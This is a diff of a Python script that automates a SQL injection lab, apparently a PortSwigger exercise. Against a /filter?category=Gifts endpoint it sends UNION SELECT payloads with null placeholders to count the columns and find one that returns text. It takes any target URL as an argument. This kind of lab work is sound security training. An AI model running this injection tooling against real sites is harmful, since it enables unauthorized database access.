@@ -1,9 +1,17 @@
-#SQL injection UNION attack, finding a column containing text
+#Problem Statement -> SQL injection UNION attack, finding a column containing text
 #Make the database retrieve the string: 'nJTfOj' 
 
 import requests
 import sys
 import urllib3
+from colorama import Fore , Back , Style , init
+
+#Defining colors
+#init(autoreset=True)
+magenta = Fore.MAGENTA
+bright = Style.BRIGHT
+reset = Style.RESET_ALL
+print(bright,magenta)
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {
@@ -19,9 +27,9 @@ def find_cloumn(url):
         if "Internal Server Error" in res.text:
             return i-1
 
-def find_colmn_withstring_datatype(url,numberof_colmn):
+def find_colmn_withstring_datatype(url,numberof_colmn,text):
     path = "/filter?category=Gifts"
-    string="'2fBMKZ'"
+    string=text
     for i in range(1,numberof_colmn+1):
         payload_list=['null']*numberof_colmn 
         payload_list[i-1] = string
@@ -33,6 +41,7 @@ def find_colmn_withstring_datatype(url,numberof_colmn):
 if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
+        text = sys.argv[2].strip()
     except IndexError:
         print("[+] Usage : python3 {} <url> <string that is asked>".format(sys.argv[0]))
         print("[+] Example : python3 {} www.example.com '2fdf'".format(sys.argv[0]))
@@ -43,7 +52,7 @@ if __name__ == "__main__":
     if numberof_colmn:
         print("There Are {} columns".format(numberof_colmn))
         print("[+] Figuring which column contain text")
-        string_column = find_colmn_withstring_datatype(url,numberof_colmn)
+        string_column = find_colmn_withstring_datatype(url,numberof_colmn,text)
         if string_column:
             print("Column that contain text is {}".format(string_column))
         else:
@@ -51,3 +60,6 @@ if __name__ == "__main__":
 
     else:
         print("Exploit was Unsuccessfulll")
+
+
+print(reset)
